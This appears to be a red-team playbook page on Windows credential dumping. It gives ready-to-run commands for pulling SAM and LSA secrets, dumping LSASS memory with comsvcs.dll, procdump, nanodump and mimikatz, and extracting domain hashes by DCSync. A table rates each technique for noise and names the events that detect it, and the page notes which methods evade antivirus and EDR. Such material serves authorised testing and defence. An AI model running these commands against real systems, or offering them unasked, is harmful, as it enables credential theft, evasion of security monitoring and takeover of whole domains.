# Credential Dumping

tags: credential, dumping, secretsdump, sam, lsa, lsass, ntds, dcsync, mimikatz, nxc, pypykatz, nanodump

## Objective
Extract credentials from compromised hosts: SAM database, LSA secrets, LSASS memory, and NTDS.dit via DCSync.

## Prerequisites
- Local admin access on target host (for SAM/LSA/LSASS)
- Replication rights for DCSync (or Domain Admin equivalent)

## Methodology

### Remote SAM + LSA Dump (OPSEC: 0.4)
```bash
# impacket — auto dumps SAM + LSA + cached creds
impacket-secretsdump 'DOMAIN/admin:pass@TARGET'

# nxc — SAM only
nxc smb TARGET -u admin -p pass --sam

# nxc — LSA secrets
nxc smb TARGET -u admin -p pass --lsa
```

### LSASS Dump Techniques

```bash
# comsvcs.dll LOLBin (OPSEC: 0.5)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\out.dmp full

# Procdump signed binary (OPSEC: 0.5)
procdump.exe -accepteula -ma lsass.exe C:\Temp\lsass.dmp

# Nanodump — direct syscalls, AV evasion (OPSEC: 0.3)
nanodump.x64.exe --write C:\Temp\out.dmp

# Mimikatz in-memory — heavily signatured (OPSEC: 0.9)
mimikatz# sekurlsa::logonpasswords
```

### Offline LSASS Parsing
```bash
# Parse dump file locally — no AV concerns
pypykatz lsa minidump lsass.dmp
```

### NTDS.dit Extraction / DCSync
```bash
# DCSync — remote, no file copy needed (OPSEC: 0.8)
impacket-secretsdump -just-dc 'DOMAIN/admin:pass@DC'

# NTLM hashes only (faster)
impacket-secretsdump -just-dc-ntlm 'DOMAIN/admin:pass@DC'

# Via nxc — DCSync
nxc smb DC -u admin -p pass --ntds

# Via nxc — VSS shadow copy method
nxc smb DC -u admin -p pass --ntds vss
```

## Graph Reporting
- **Credential nodes**: `type: credential`, with `cred_type` (NTLM/plaintext/ticket)
- **VALID_ON edges**: credential → user node
- **ADMIN_TO edges**: where dumped creds grant admin access on other hosts
- Validate dumped creds: `nxc smb TARGETS -u user -H hash --continue-on-success`

## OPSEC Notes

| Technique | Noise Rating | Detection |
|-----------|-------------|-----------|
| Remote SAM dump | 0.4 | Event 4656/4663 registry access |
| LSA secrets | 0.4 | Event 4656/4663 |
| comsvcs.dll LSASS dump | 0.5 | Sysmon Event 10, command line logging |
| Procdump LSASS | 0.5 | Sysmon Event 10 |
| Nanodump | 0.3 | Direct syscalls evade most EDR |
| Mimikatz in-memory | 0.9 | Heavily signatured by all AV/EDR |
| DCSync | 0.8 | Event 4662 with replication GUIDs |
| NTDS VSS | 0.7 | Event 4656 on ntds.dit, VSS creation |

**Detection**: Sysmon Event 10 (ProcessAccess on lsass.exe), 4656/4663 (object access), `comsvcs.dll` + `MiniDump` in command line, 4662 with GUIDs for DCSync.

## Sequencing
- **After**: Lateral Movement (need admin on host), AD Privilege Escalation (for DCSync rights)
- **Feeds →**: Password Spraying (validate creds), Lateral Movement (use dumped creds), Kerberos Attacks (use hashes)
